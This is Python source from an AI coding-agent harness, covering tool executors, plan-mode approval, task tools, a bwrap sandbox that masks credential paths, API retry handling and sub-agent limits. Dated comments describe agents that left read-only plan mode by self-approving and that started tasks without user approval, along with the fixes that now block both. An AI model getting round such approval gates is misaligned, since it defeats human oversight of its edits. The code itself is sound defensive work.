        if not isinstance(payload, dict):
            return json.dumps({"error": "runner must return a dict payload"})
        return json.dumps(payload, ensure_ascii=False)

    def _execute_subagent_result(self, arguments: dict) -> str:
        from . import subagents as _sa
        sa_id = (arguments.get("sa_id") or "").strip()
        if not sa_id:
            return json.dumps({"error": "sa_id is required"})
        return json.dumps(_sa.get_subagent_result(sa_id), ensure_ascii=False)

    # ------- Skill invocation ---------------------------------------------

    def _execute_skill(
        self, arguments: dict, perms: Optional["KitToolPermissions"]
    ) -> str:
        """Resolve a named skill and return its body verbatim.

        Skills are project-overridable Markdown playbooks; this
        executor just discovers and renders them. The agent is
        expected to read the returned body and follow it.
        """
        from . import skills as _skills_mod
        name = (arguments.get("name") or "").strip()
        args = (arguments.get("args") or "").strip()
        if not name:
            return json.dumps({"error": "skill name must be non-empty"})
        workspace = perms.workspace if perms is not None else None
        sk = _skills_mod.get_skill(name, workspace)
        if sk is None:
            available = [s.name for s in _skills_mod.discover_skills(workspace)]
            return json.dumps({
                "error": f"skill '{name}' not found",
                "available": available,
            })
        return json.dumps({
            "status": "ok",
            "skill": sk.name,
            "description": sk.description,
            "source": str(sk.source),
            "content": _skills_mod.render_skill_invocation(sk, args),
        }, ensure_ascii=False)

    # ------- Plan-mode roundtrip ------------------------------------------

    _VALID_POST_PLAN_MODES = ("default", "acceptEdits", "bypassPermissions")

    def _execute_exit_plan_mode(
        self, arguments: dict, perms: Optional["KitToolPermissions"]
    ) -> str:
        """Submit a plan for approval. On approve, flip ``perms.mode``.

        Plan-mode is read-only by contract; the only way out is for the
        agent to surface the plan and for the user to acknowledge it.
        Without a ``plan_approval_callback`` we accept silently and
        switch to ``default`` so headless tests don't deadlock.
        """
        if perms is None:
            return json.dumps({"error": (
                "exit_plan_mode requires permissions to be configured"
            )})
        plan = (arguments.get("plan") or "").strip()
        if not plan:
            return json.dumps({"error": "plan must be non-empty"})
        if perms.mode != "plan":
            return json.dumps({"error": (
                f"exit_plan_mode is only valid while in 'plan' mode "
                f"(current mode: {perms.mode!r})"
            )})
        if perms.plan_approval_callback is None:
            # No approval channel (headless / non-interactive). Plan mode is a
            # HARD human gate: NEVER self-approve. Submit the plan, keep
            # ``perms.mode == 'plan'`` so all edits/writes/bash stay blocked,
            # and stop. (Fixed 2026-07-14: this used to auto-approve and flip
            # to 'default', letting the agent leave plan mode on its own and
            # keep editing — plan mode must not be self-exitable.)
            return json.dumps({
                "status": "awaiting_approval",
                "message": (
                    "Plan submitted. No approval channel is available in this "
                    "context, so the plan cannot be approved here — plan mode "
                    "stays ACTIVE and all edits/writes remain blocked. Stop "
                    "now; do NOT edit, do NOT resubmit. Only the user can "
                    "approve, which resumes execution on a later turn."
                ),
            })
        approved = False
        new_mode = "default"
        if perms.plan_approval_callback is not None:
            try:
                resp = perms.plan_approval_callback(plan)
            except Exception as exc:
                return json.dumps({"error": f"plan approval raised: {exc}"})
            if not isinstance(resp, dict):
                return json.dumps({"error": (
                    "plan_approval_callback must return a dict "
                    "{approved: bool, new_mode?: str}"
                )})
            approved = bool(resp.get("approved", False))
            # A timeout is NOT a rejection: the user simply hasn't clicked yet.
            # Returning "rejected" here made the agent re-submit the same plan,
            # blocking for the full approval window AGAIN (observed 2026-06-25:
            # two exit_plan_mode calls × 10 min = a 21-min hang, nothing built).
            # Tell it plainly to STOP and wait instead — the user can still
            # approve in the UI, which resumes execution on a fresh turn.
            if not approved and resp.get("timed_out"):
                return json.dumps({
                    "status": "awaiting_approval",
                    "message": (
                        "Plan submitted — still awaiting the user's approval "
                        "in the dashboard. This is NOT a rejection. Stop here "
                        "and wait; do NOT resubmit the plan. The user will "
                        "approve in the UI, which resumes execution."
                    ),
                })
            requested_mode = (resp.get("new_mode") or "default")
            if requested_mode not in self._VALID_POST_PLAN_MODES:
                return json.dumps({"error": (
                    f"plan_approval_callback returned unsupported "
                    f"new_mode: {requested_mode!r}. Use one of "
                    f"{list(self._VALID_POST_PLAN_MODES)}."
                )})
            new_mode = requested_mode
        if approved:
            perms.mode = new_mode
            perms.last_approved_plan = plan
            # Re-state the approved plan as the authoritative, MOST-RECENT
            # instruction so execution anchors on it — not on stale context.
            # Bug 2026-06-25: in a session whose context still held an earlier
            # task (a prior Tetris build keyed to the same project), the agent
            # presented a CORRECT spreadsheet plan, got it approved, then
            # emitted a verbatim `mkdir tetris_app/...` from the leftover
            # context. A recency-anchored "execute exactly THIS plan, ignore
            # any earlier different task" curbs that drift.
            _anchor = plan if len(plan) <= 8000 else plan[:8000] + " …[truncated]"
            return json.dumps({
                "status": "approved",
                "new_mode": new_mode,
                "plan_chars": len(plan),
                "instruction": (
                    "Plan APPROVED — execute EXACTLY this approved plan and "
                    "nothing else. If anything EARLIER in the conversation "
                    "describes a DIFFERENT task or project (a different app, "
                    "different file names), IGNORE it: this approved plan is "
                    "the single source of truth for what to build now.\n\n"
                    + _anchor
                ),
            })
        return json.dumps({
            "status": "rejected",
            "mode": perms.mode,
        })

    # ------- Structured user question -------------------------------------

    def _execute_ask_user_question(
        self, arguments: dict, perms: Optional["KitToolPermissions"]
    ) -> str:
        """Surface a multi-choice question to the user via the bound UI.

        Validates the schema (2-6 options, each with a label) and
        delegates to ``perms.ask_user_callback``. Returns a JSON payload
        with the selected ``answers`` (list of label strings). When the
        callback raises or no UI is bound, returns an explicit error so
        the agent can fall back to a plain-prose question.
        """
        question = (arguments.get("question") or "").strip()
        options = arguments.get("options") or []
        header = (arguments.get("header") or "").strip()
        multi_select = bool(arguments.get("multiSelect", False))
        if not question:
            return json.dumps({"error": "question must be non-empty"})
        if not isinstance(options, list) or not (2 <= len(options) <= 6):
            return json.dumps({"error": (
                "options must be a list of 2-6 entries"
            )})
        norm_options: list[dict] = []
        for opt in options:
            if not isinstance(opt, dict):
                return json.dumps({"error": (
                    "each option must be {label, description?}"
                )})
            label = (opt.get("label") or "").strip()
            if not label:
                return json.dumps({"error": "each option needs a label"})
            norm_options.append({
                "label": label,
                "description": (opt.get("description") or "").strip(),
            })
        if perms is None or perms.ask_user_callback is None:
            return json.dumps({
                "error": "ask_user_question is not available in this context",
                "hint": (
                    "Fall back to asking the question in plain prose; "
                    "no interactive UI is bound to this agent."
                ),
            })
        normalised = {
            "question": question,
            "header": header,
            "options": norm_options,
            "multiSelect": multi_select,
        }
        try:
            result = perms.ask_user_callback(normalised)
        except Exception as exc:
            return json.dumps({"error": f"ask_user failed: {exc}"})
        if not isinstance(result, dict):
            return json.dumps({"error": "ask_user returned non-dict result"})
        answers = result.get("answers")
        if not isinstance(answers, list) or not all(
            isinstance(a, str) for a in answers
        ):
            return json.dumps({"error": (
                "ask_user must return {'answers': list[str]}"
            )})
        if not multi_select and len(answers) > 1:
            answers = answers[:1]
        return json.dumps({
            "answers": answers,
            "multiSelect": multi_select,
        })

    # ------- Planning tools (TaskCreate / Update / List) ------------------

    def _task_store(self, perms: "KitToolPermissions"):
        """Get the per-workspace TaskStore singleton."""
        from . import agent_tasks as _at
        return _at.get_store(perms.workspace)

    def _execute_task_create(
        self, arguments: dict, perms: "KitToolPermissions"
    ) -> str:
        # Plan mode is read-only: creating a task list STARTS execution (the
        # per-turn open-tasks reminder then auto-drives the agent through it).
        # In plan mode the agent must present the plan and stop for approval —
        # tasks are created once the user accepts (exit_plan_mode / "Accept
        # plan & execute"). Bug 20260708-092217: a plan-mode dashboard agent
        # self-created + started a task and ran off into auto-continue.
        if getattr(perms, "mode", "") == "plan":
            return json.dumps({"error": _PLAN_MODE_TASK_REJECT})
        subject = (arguments.get("subject", "") or "").strip()
        description = arguments.get("description", "") or ""
        active_form = arguments.get("active_form", "") or ""
        blocked_by_raw = arguments.get("blocked_by") or []
        blocked_by: list[int] = []
        if isinstance(blocked_by_raw, (list, tuple)):
            for b in blocked_by_raw:
                try:
                    blocked_by.append(int(b))
                except (TypeError, ValueError):
                    return json.dumps({"error": f"blocked_by must be int IDs; got {b!r}"})
        if not subject:
            return json.dumps({"error": "subject must be non-empty"})
        try:
            task = self._task_store(perms).create(
                subject, description, active_form,
                session_id=getattr(perms, "task_session_id", "") or "",
                blocked_by=blocked_by,
            )
        except ValueError as exc:
            return json.dumps({"error": str(exc)})
        except Exception as exc:
            return json.dumps({"error": f"task_create failed: {exc}"})
        # Session-relative display number (bug 172400): the new task is the
        # latest in its session, so annotate it with its `seq`. The global
        # `id` stays the key the agent must pass to task_update/task_get.
        sid = getattr(perms, "task_session_id", "") or ""
        try:
            annotated = self._task_store(perms).list(
                session_id=sid if sid else None, with_seq=True)
            seq = next((t.get("seq") for t in annotated
                        if int(t.get("id", 0)) == int(task["id"])), None)
        except Exception:
            seq = None
        if seq is not None:
            task = {**task, "seq": seq}
        label = f"task {seq}" if seq is not None else f"task #{task['id']}"
        return json.dumps({
            "status": "created",
            "task": task,
            "hint": (
                f"{label} added (id {task['id']}). Refer to it as "
                f"\"{label}\" when talking to the user; pass id "
                f"{task['id']} to task_update/task_get. Mark in_progress "
                "when you start, completed when done."
            ),
        }, ensure_ascii=False)

    def _execute_task_update(
        self, arguments: dict, perms: "KitToolPermissions"
    ) -> str:
        # Plan mode is read-only: moving a task to in_progress/completed STARTS
        # or advances execution, which must wait for plan approval. Metadata-only
        # edits are harmless, but a status escalation is the "auto-continue"
        # trigger (bug 20260708-092217), so gate it in plan mode.
        if getattr(perms, "mode", "") == "plan":
            _status = str(arguments.get("status", "") or "").strip().lower()
            if _status in ("in_progress", "completed"):
                return json.dumps({"error": _PLAN_MODE_TASK_REJECT})
        try:
            task_id = int(arguments.get("task_id"))
        except (TypeError, ValueError):
            return json.dumps({
                "error": f"task_id must be int, got {arguments.get('task_id')!r}"
            })
        fields = {
            k: arguments.get(k)
            for k in ("status", "subject", "description", "active_form")
            if arguments.get(k) is not None
        }
        if not fields:
            return json.dumps({
                "error": "at least one field (status / subject / description / active_form) must be provided"
            })
        try:
            task = self._task_store(perms).update(task_id, **fields)
        except KeyError as exc:
            return json.dumps({"error": str(exc).strip("'")})
        except ValueError as exc:
            return json.dumps({"error": str(exc)})
        except Exception as exc:
            return json.dumps({"error": f"task_update failed: {exc}"})
        return json.dumps({"status": "updated", "task": task},
                          ensure_ascii=False)

    def _execute_task_list(
        self, arguments: dict, perms: "KitToolPermissions"
    ) -> str:
        include_deleted = bool(arguments.get("include_deleted", False))
        _sid = getattr(perms, "task_session_id", "") or ""
        try:
            tasks = self._task_store(perms).list(
                include_deleted=include_deleted,
                session_id=_sid if _sid else None,
                with_seq=True,
            )
        except Exception as exc:
            return json.dumps({"error": f"task_list failed: {exc}"})
        # Group by status so the agent can summarise progress easily.
        grouped: dict[str, list] = {
            "in_progress": [], "pending": [],
            "completed": [], "deleted": [],
        }
        for t in tasks:
            grouped.setdefault(t.get("status", "pending"), []).append(t)
        return json.dumps({
            "count": len(tasks),
            "by_status": {k: len(v) for k, v in grouped.items() if v},
            "tasks": tasks,
        }, ensure_ascii=False)

    def _execute_task_get(
        self, arguments: dict, perms: "KitToolPermissions"
    ) -> str:
        try:
            task_id = int(arguments.get("task_id"))
        except (TypeError, ValueError):
            return json.dumps({
                "error": f"task_id must be int, got {arguments.get('task_id')!r}"
            })
        try:
            task = self._task_store(perms).get(task_id)
        except Exception as exc:
            return json.dumps({"error": f"task_get failed: {exc}"})
        if task is None:
            return json.dumps({"error": f"task #{task_id} not found"})
        return json.dumps({"task": task}, ensure_ascii=False)

    # ------- Web tools (search + fetch) -----------------------------------

    def _execute_web_search(self, arguments: dict) -> str:
        query = (arguments.get("query", "") or "").strip()
        max_results = int(arguments.get("max_results", 8) or 8)
        max_results = max(1, min(max_results, 20))
        if not query:
            return json.dumps({"error": "query must be non-empty"})
        try:
            from . import web_tools as _wt
            payload = _wt.web_search(query, max_results=max_results)
        except Exception as exc:
            return json.dumps({"error": f"web_search failed: {exc}"})
        return json.dumps(payload, ensure_ascii=False)

    def _execute_web_fetch(self, arguments: dict) -> str:
        url = (arguments.get("url", "") or "").strip()
        timeout_s = int(arguments.get("timeout_s", 15) or 15)
        timeout_s = max(1, min(timeout_s, 60))
        if not url:
            return json.dumps({"error": "url must be non-empty"})
        try:
            from . import web_tools as _wt
            payload = _wt.web_fetch(url, timeout_s=timeout_s)
        except Exception as exc:
            return json.dumps({"error": f"web_fetch failed: {exc}"})
        return json.dumps(payload, ensure_ascii=False)


# Singleton — shared across all OpenAIClient instances.
_doc_executor = _DocToolExecutor()


_BWRAP_FUNCTIONAL: Optional[bool] = None
_AUTO_ISOLATION_ANNOUNCED = False


def _bwrap_functional() -> bool:
    """True only if bwrap is installed AND actually works here (some CI/HPC
    containers ship bwrap but forbid the user-namespace it needs). Probed once
    and cached so the per-command path stays cheap. Never raises."""
    global _BWRAP_FUNCTIONAL
    if _BWRAP_FUNCTIONAL is not None:
        return _BWRAP_FUNCTIONAL
    ok = False
    try:
        if shutil.which("bwrap"):
            # Probe the SAME namespace shape the real wrap uses (ro-bind /,
            # /dev, /proc, tmpfs /tmp) — a minimal probe could pass where the
            # real wrap fails (e.g. /proc or user-namespace restricted), which
            # would then break every bash command in bypass mode with no
            # fallback. Match the real wrap so we fail to plain bash instead.
            r = subprocess.run(
                ["bwrap", "--ro-bind", "/", "/", "--dev", "/dev",
                 "--proc", "/proc", "--tmpfs", "/tmp", "true"],
                capture_output=True, timeout=5,
            )
            ok = r.returncode == 0
    except Exception:
        ok = False
    _BWRAP_FUNCTIONAL = ok
    return ok


def _announce_auto_isolation() -> None:
    """Surface (once) that filesystem isolation auto-engaged, so it's visible
    that an unattended run is sandboxed."""
    global _AUTO_ISOLATION_ANNOUNCED
    if _AUTO_ISOLATION_ANNOUNCED:
        return
    _AUTO_ISOLATION_ANNOUNCED = True
    _record_security_event(
        "isolation", "bash",
        "filesystem isolation auto-engaged for this unattended (bypass) run",
        blocked=False,
    )


def _bash_isolation_argv(
    cmd: str,
    run_cwd,
    perms,
    mode: str | None = None,
) -> list[str]:
    """argv for the agent's bash tool, optionally bwrap-isolated.

    With ``agent.bash_isolation = "bwrap"`` (and bwrap installed) the
    command runs in a filesystem namespace where ONLY the workspace roots
    (workspace + granted extra dirs) are writable: ``/`` is read-only,
    ``/tmp`` is a fresh tmpfs, and credential paths under ``$HOME`` are
    masked (reusing the sandbox module's secret list).  This closes the
    gap where a subprocess (``python script.py``) could write outside the
    sandbox even though direct path arguments were refused.  Network stays
    available (git/pip are legitimate); the isolation target is FS writes.

    ``mode=None`` reads ``agent.bash_isolation`` from settings ("off"
    default — opt-in, since HPC setups may need unrestricted bash).
    """
    plain = ["/bin/bash", "-c", cmd]
    if mode is None:
        try:
            from delfin.user_settings import load_settings
            mode = str(((load_settings() or {}).get("agent") or {})
                       .get("bash_isolation", "auto") or "auto")
        except Exception:
            mode = "auto"
    mode = mode.strip().lower()
    # "auto" (default): hard-isolate ONLY in the unattended/permissive
    # permission mode (bypassPermissions) where no human approves each
    # command — that's where containment matters most. Interactive modes keep
    # plain bash, so HPC coding workflows are unaffected. "off" is the explicit
    # escape hatch (truly no isolation); "bwrap" forces it everywhere.
    if mode == "auto":
        perm_mode = str(getattr(perms, "mode", "") or "").strip()
        if perm_mode == "bypassPermissions" and _bwrap_functional():
            mode = "bwrap"
            _announce_auto_isolation()
        else:
            return plain
    if mode != "bwrap" or not shutil.which("bwrap"):
        return plain

    try:
        from delfin.agent.sandbox import _HOME_SECRET_DIRS
    except Exception:
        _HOME_SECRET_DIRS = ()
    home = Path.home()
    args: list[str] = [
        "bwrap",
        "--ro-bind", "/", "/",
        "--dev", "/dev",
        "--proc", "/proc",
        "--tmpfs", "/tmp",
    ]
    for rel in _HOME_SECRET_DIRS:
        p = home / rel
        try:
            # resolve() — on HPC, $HOME is often a symlink (/home/... →
            # /pfs/...); bwrap cannot create mountpoints through symlinked
            # paths ("Can't mkdir parents").  Mask the REAL path.
            rp = p.resolve()
            if rp.is_dir():
                args += ["--tmpfs", str(rp)]
            elif rp.is_file():
                args += ["--ro-bind", "/dev/null", str(rp)]
        except OSError:
            continue
    try:
        roots = [str(Path(r).resolve()) for r in perms.all_workspace_roots()]
    except Exception:
        roots = [str(Path(getattr(perms, "workspace", ".")).resolve())]
    for r in roots:
        args += ["--bind", r, r]
    args += ["--chdir", str(Path(run_cwd).resolve()),
             "--die-with-parent"] + plain
    return args


def _is_stream_unsupported_error(exc: Exception) -> bool:
    """Proxy signature for "this request cannot be streamed".

    Observed in production on the KIT litellm proxy (azure.gpt-5.4,
    dashboard): HTTP 400 with detail "'async for' requires an object
    with __aiter__ method, got ModelResponse" — the proxy's upstream
    call returned a non-streaming response while the client asked for
    ``stream=True``.  The cure is to retry once without streaming.
    """
    s = str(exc)
    return ("__aiter__" in s and "ModelResponse" in s) \
        or "'async for' requires" in s


# A handful of API/stream failures are TRANSIENT — a shared-proxy hiccup, not a
# bad request. On Jerome's long KIT runs (vLLM behind an Open-WebUI proxy) a
# single 503/timeout shouldn't kill the whole turn; it's worth a brief retry.
_STREAM_RETRY_MAX = 3
_TRANSIENT_API_STATUS = frozenset({408, 409, 425, 429, 500, 502, 503, 504})
_TRANSIENT_NAME_HINTS = (
    "timeout", "connection", "ratelimit", "internalserver",
    "serviceunavailable", "apiconnection", "remoteprotocol",
    "remotedisconnect", "overloaded",
)


def _is_transient_api_error(exc: Exception) -> bool:
    """Whether an API/streaming error is a transient hiccup worth retrying
    (timeout, dropped connection, rate-limit, 5xx) rather than a deterministic
    failure (400/401/404) that would just fail again. Class-name + HTTP-status
    based so we don't import the openai/httpx exception hierarchy."""
    name = type(exc).__name__.lower()
    if any(h in name for h in _TRANSIENT_NAME_HINTS):
        return True
    status = getattr(exc, "status_code", None)
    if not isinstance(status, int):
        status = getattr(exc, "status", None)
    if isinstance(status, int) and status in _TRANSIENT_API_STATUS:
        return True
    # A shared proxy (litellm → vLLM, the KIT toolbox) intermittently wraps an
    # INTERNAL failure as a 400 — most often a "Extra data: line 1 column N"
    # JSON-decode hiccup inside the proxy on large tool-heavy requests. That is
    # NOT a genuine bad request: re-issuing the identical request succeeds
    # (observed 2026-06-25 — failed twice, then 6/6 OK). "Extra data" is a
    # json.JSONDecodeError signature that real bad-request errors never carry,
    # so matching it (scoped to the proxy) retries the hiccup without retrying
    # true client errors (model-not-found, context-length, bad params).
    msg = str(exc)
    if "Extra data" in msg and ("vllm" in msg.lower() or "litellm" in msg.lower()):
        return True
    return False


_CONTEXT_LENGTH_HINTS = (
    "context_length_exceeded", "context length exceeded",
    "maximum context length", "reduce the length", "too many tokens",
    "exceeds the maximum", "prompt is too long", "input is too long",
)


def _is_context_length_error(exc: Exception) -> bool:
    """Whether an API error means the request exceeded the model's context
    window. Such a 400 is deterministic (retrying the identical request just
    fails again), so instead of crashing the turn we end it cleanly and let the
    engine compact before the next turn."""
    msg = str(exc).lower()
    if any(h in msg for h in _CONTEXT_LENGTH_HINTS):
        return True
    name = type(exc).__name__.lower()
    return "contextwindow" in name or "contextlength" in name


def _max_subagent_depth() -> int:
    """Deepest sub-agent nesting allowed. A child at this depth may not spawn
    further sub-agents, preventing 4^depth thread/worktree fan-out. Default 1
    (top-level agent spawns children; children don't spawn). Override via
    DELFIN_MAX_SUBAGENT_DEPTH."""
    try:
        v = int(os.environ.get("DELFIN_MAX_SUBAGENT_DEPTH", "") or 0)
    except (TypeError, ValueError):
        v = 0
    return v if v > 0 else 1


# Bound concurrent BACKGROUND sub-agents (the foreground fan-out is already
# capped at 4 workers). Each background call spawns a daemon thread + possibly
# a worktree; without a cap a session could leak unbounded threads. Created
# lazily so the env override is read once, at first use.
_BG_SUBAGENT_SEM: Optional[threading.BoundedSemaphore] = None
_BG_SUBAGENT_SEM_LOCK = threading.Lock()


def _acquire_bg_subagent_slot():
    """Non-blocking acquire of a background-subagent slot. Returns a release
    callable on success, or None when the cap is saturated."""
    global _BG_SUBAGENT_SEM
    if _BG_SUBAGENT_SEM is None:
        with _BG_SUBAGENT_SEM_LOCK:
            if _BG_SUBAGENT_SEM is None:
                try:
                    n = int(os.environ.get("DELFIN_MAX_BG_SUBAGENTS", "") or 0)
                except (TypeError, ValueError):
                    n = 0
                _BG_SUBAGENT_SEM = threading.BoundedSemaphore(n if n > 0 else 8)
    if _BG_SUBAGENT_SEM.acquire(blocking=False):
        return _BG_SUBAGENT_SEM.release
    return None


def _subagent_collect_timeout() -> float:
    """Upper bound for waiting on a fanned-out sub-agent future. The child's own
    wall-clock guard fires per streamed event, but a fully STALLED stream (no
    events) would never trip it — so the parent abandons the wait a bit past the
    child's wall budget instead of blocking the whole turn indefinitely."""
    try:
        from . import subagents as _sa
        wall = float(_sa._subagent_limits().get("max_wall_s", 300) or 300)
    except Exception:
        wall = 300.0
    return wall + 120.0


def _fan_out_subagents(tc_list, permissions):
    """Submit every ``subagent`` tool-call in ``tc_list`` to a thread
    pool so a multi-subagent turn runs concurrently (parallel
    fan-out).

    Returns ``(futures_by_id, executor)``.  When fewer than two subagent
    calls are present, returns ``({}, None)`` so the caller's sequential
    dispatch path is unchanged.  Each child still enforces its own hard
    limits inside ``run_subagent`` — this only overlaps wall-clock.
    """
    import concurrent.futures as _cf

    sub_ids = [
        tc["id"] for tc in tc_list
        if (tc.get("function", {}).get("name") or "").strip() == "subagent"
    ]
    if len(sub_ids) < 2:
        return {}, None
    executor = _cf.ThreadPoolExecutor(
        max_workers=min(len(sub_ids), 4),
        thread_name_prefix="subagent-fan",
    )
    futures: dict[str, Any] = {}
    for tc in tc_list:
        if tc["id"] not in sub_ids:
            continue
        try:
            args = json.loads(tc["function"]["arguments"])
        except json.JSONDecodeError:
            args = {}
        # Auto-isolation: when ≥2 subagents fan out in parallel, give each
        # WRITER (a non-read-only preset, e.g. general-purpose) its OWN git
        # worktree so concurrent edits can't clobber one another on the shared
        # tree. Read-only presets (explore/plan/code-reviewer) need none. An
        # explicit isolation in the call is respected. Falls back gracefully
        # when the workspace isn't a git repo.
        try:
            from . import subagents as _sa_fan
            if (not args.get("isolation")
                    and _sa_fan.is_writer_preset(args.get("subagent_type", ""))):
                args["isolation"] = "worktree"
        except Exception:
            pass
        futures[tc["id"]] = executor.submit(
            _doc_executor.execute, "subagent", args, permissions=permissions,
        )
    return futures, executor


def _infer_provider_from_base_url(base_url: str) -> str:
    """Best-effort provider id from an OpenAI-compatible base_url.

    Used only when ``OpenAIClient`` is constructed without an explicit
    ``provider`` (create_client always passes one). ``localhost:11434`` and
    no-auth local servers → ollama; the KIT host → kit; else openai.
    """
    u = (base_url or "").lower()
    if not u:
        return "openai"
    if "11434" in u or "ki-toolbox" not in u and ("localhost" in u or "127.0.0.1" in u):
        return "ollama"
    if "ki-toolbox" in u or "kit.edu" in u:
        return "kit"
    return "openai"


class OpenAIClient(_BaseClient):
    """Use the OpenAI Python SDK for GPT / o-series models.

    Requires an API key (``OPENAI_API_KEY`` or passed explicitly).
    Supports text streaming, cost tracking, and local doc-search tools
    via OpenAI function calling.
    """

    DEFAULT_MODEL = "gpt-4.1"

    # Pricing per million tokens (USD).
    # Keys are base model names; _estimate_cost strips "azure." prefix.
    _PRICING: dict[str, tuple[float, float]] = {
        # GPT-5 family
        "gpt-5.4": (2.0, 8.0),
        "gpt-5.4-mini": (0.40, 1.60),
        "gpt-5.3-codex": (2.0, 8.0),
        "gpt-5.2-codex": (2.0, 8.0),
        "gpt-5.2": (2.0, 8.0),
        "gpt-5.1": (2.0, 8.0),
        "gpt-5.1-codex-max": (2.0, 8.0),
        "gpt-5.1-codex-mini": (0.40, 1.60),
        "gpt-5": (2.0, 8.0),
        "gpt-5-mini": (0.40, 1.60),
        "gpt-5-nano": (0.10, 0.40),
        # GPT-4 family
        "gpt-4.1": (2.0, 8.0),
        "gpt-4.1-mini": (0.40, 1.60),
        "gpt-4.1-nano": (0.10, 0.40),
        # o-series reasoning
        "o4-mini": (1.10, 4.40),
        "o3": (2.0, 8.0),
    }

    def __init__(self, api_key: str = "", model: str = "",
                 base_url: str = "", key_env_var: str = "OPENAI_API_KEY",
                 permissions: Optional["KitToolPermissions"] = None,
                 provider: str = ""):
        try:
            import openai  # noqa: F401
        except ImportError:
            _auto_install("openai", "openai>=1.0")
            import openai  # noqa: F401
        from .credentials import load_credential as _load_cred_oai
        resolved_key = api_key or _load_cred_oai(key_env_var)
        if not resolved_key:
            raise ValueError(
                f"No API key found. Either set {key_env_var} in the "
                "environment, or run `python -m delfin.agent.cli "
                f"credentials set {key_env_var}` to store it in "
                "~/.delfin/credentials.json (chmod 0600)."
            )
        import openai

        self.model = model or self.DEFAULT_MODEL
        # Provider identity ("openai"|"kit"|"ollama"). Used to gate
        # provider-specific request shaping (Ollama num_ctx, reasoning_effort
        # suppression) and per-model capability resolution. Inferred from the
        # base_url when not passed, so existing callers keep working.
        self._provider = (provider or _infer_provider_from_base_url(base_url)).strip().lower()
        self._base_url = base_url or ""
        # Kept so capability resolution can authenticate the /v1/models probe
        # (KIT requires a Bearer key to report its true max_model_len window).
        self._api_key = resolved_key
        kwargs: dict[str, Any] = {"api_key": resolved_key}
        if base_url:
            kwargs["base_url"] = base_url
        # Explicit per-request timeout so a stalled endpoint (no bytes) is
        # abandoned on a bounded schedule instead of hanging on the SDK's
        # implicit default. Generous — legitimate streams emit chunks far more
        # often; override via DELFIN_REQUEST_TIMEOUT_S.
        try:
            _req_timeout = float(os.environ.get(
                "DELFIN_REQUEST_TIMEOUT_S", "") or 0)
        except (TypeError, ValueError):
            _req_timeout = 0.0
        kwargs["timeout"] = _req_timeout if _req_timeout > 0 else 600.0
        self.client = openai.OpenAI(**kwargs)
        # KIT-Toolbox coding-agent permissions (None disables write/edit/bash).
        self._permissions: Optional[KitToolPermissions] = permissions
        # Mid-loop steering inbox: the dashboard pushes a user message here WHILE
        # the tool loop is running; stream_message drains it between rounds and
        # injects it so the model reacts within the SAME turn (no need to wait
        # for the turn to end).
        import threading as _threading
        self._steer_lock = _threading.Lock()
        self._steer_msgs: list[str] = []
        self._attach_subagent_runner(permissions)

    def push_steer(self, text: str) -> None:
        """Queue a user message for MID-LOOP injection (thread-safe). Picked up
        between tool rounds by ``stream_message`` and fed to the model."""
        t = (text or "").strip()
        if t:
            with self._steer_lock:
                self._steer_msgs.append(t)

    def _drain_steer(self) -> list[str]:
        with self._steer_lock:
            if not self._steer_msgs:
                return []
            out = self._steer_msgs[:]
            self._steer_msgs.clear()
            return out

    def _has_pending_tasks(self) -> bool:
        """True if the current session still has open (pending/in_progress)
        tasks — used to auto-continue a model that stops mid-build (o3)."""
        perms = getattr(self, "_permissions", None)
        if perms is None:
            return False
        try:
            from .agent_tasks import get_store
            store = get_store(perms.workspace)
            sid = getattr(perms, "task_session_id", "") or None
            return any(
                t.get("status") in ("pending", "in_progress")
                for t in store.list(session_id=sid))
        except Exception:
            return False

    def _attach_subagent_runner(
        self, permissions: Optional["KitToolPermissions"],
    ) -> None:
        """Wire ``permissions.subagent_runner`` to a closure over self.

        Idempotent — re-binding on every set_permissions ensures a
        sub-agent always runs against the current parent client.
        """
        if permissions is None:
            return
        from . import subagents as _sa

        def _runner(
            *, subagent_type: str, description: str, prompt: str,
            isolation: str = "", resume_from: str = "", sa_id: str = "",
        ) -> dict:
            res = _sa.run_subagent(
                subagent_type=subagent_type,
                description=description,
                prompt=prompt,
                parent_client=self,
                parent_perms=self._permissions,
                isolation=isolation,
                resume_from=resume_from,
                sa_id=sa_id,
            )
            return res.to_payload()

        try:
            permissions.subagent_runner = _runner
        except Exception:
            pass

    def set_permissions(self, permissions: Optional["KitToolPermissions"]) -> None:
        """Replace the KIT-Toolbox permissions policy at runtime."""
        self._permissions = permissions
        self._attach_subagent_runner(permissions)

    def switch_model(self, model: str) -> None:
        """Switch model (no process to kill, just update the name)."""
        if model and model != self.model:
            self.model = model

    def kill(self) -> None:
        """No-op — API client has no persistent process."""

    @property
    def session_id(self) -> str:
        """OpenAI backend has no session concept."""
        return ""

    def _estimate_cost(self, input_tokens: int, output_tokens: int) -> float:
        # Strip provider prefix (e.g. "azure.gpt-5.1" -> "gpt-5.1")
        base = self.model.split(".", 1)[-1] if self.model.startswith(("azure.", "kit.")) else self.model
        pricing = self._PRICING.get(base) or self._PRICING.get(self.model)
        if not pricing:
            pricing = (2.0, 8.0)
        return (input_tokens * pricing[0] + output_tokens * pricing[1]) / 1_000_000

    def stream_message(
        self,
        system: str,
        messages: list[dict[str, Any]],
        max_tokens: int = 8192,
        session_id: str = "",
        thinking_budget: int = 0,
    ) -> Generator[StreamEvent, None, None]:
        """Stream via the OpenAI Chat Completions API.

        Includes local doc-search tools via function calling.  When the
        model calls a doc tool, the result is executed locally and fed
        back in a tool-call loop (up to 5 rounds).
        """
        api_messages: list[dict[str, Any]] = []
        # Detect reasoning models. Two families today:
        # - o-series (o1, o3, o4-mini, azure.o3, azure.o4-mini)
        # - GPT-5 family (Azure ships gpt-5 / gpt-5.1 / gpt-5.4 / gpt-5-mini
        #   as reasoning models that REQUIRE ``reasoning_effort`` to be
        #   set or they silently consume the budget on internal reasoning
        #   and emit zero text tokens — the live regression we just hit
        #   on "Öffne Calculations" with Azure GPT-5.4 was exactly this).
        _base = self.model.split(".", 1)[-1] if self.model.startswith(("azure.", "kit.")) else self.model
        import re as _re_reason
        is_reasoning = bool(
            _re_reason.match(r"^o\d", _base)        # o1 / o3 / o4 ...
            or _base.startswith("gpt-5")             # GPT-5 family
        )

        # Resolve the active model's real capabilities once per turn. Drives
        # the Ollama num_ctx override (so local models use their full window
        # instead of the silent 2-4k default), the weak/strong tool surface,
        # and the no-native-tools gate. Never raises — degrades to None.
        try:
            from .model_capabilities import resolve as _resolve_caps
            _caps = _resolve_caps(self._provider, self.model, self._base_url,
                                  api_key=getattr(self, "_api_key", ""))
        except Exception:
            _caps = None

